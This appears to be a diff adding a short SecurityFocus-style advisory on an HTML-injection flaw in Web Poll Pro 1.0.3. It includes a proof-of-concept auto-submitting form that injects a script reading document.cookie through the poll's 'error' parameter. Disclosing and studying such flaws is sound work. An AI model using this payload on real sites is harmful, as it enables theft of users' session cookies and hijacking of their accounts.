@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/46932/info
+
+Web Poll Pro is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, or launch other attacks.
+
+Web Poll Pro 1.0.3 is vulnerable; other versions may also be affected. 
+
+<form action="http://host/poll/poll.php&page=edit" method="post" name="main">
+<input type="hidden" name="poll" value="1">
+<input type="hidden" name="error" value=&#039;description"><script>alert(document.cookie)</script>&#039;>
+</form>
+<script>
+document.main.submit();
+</script>
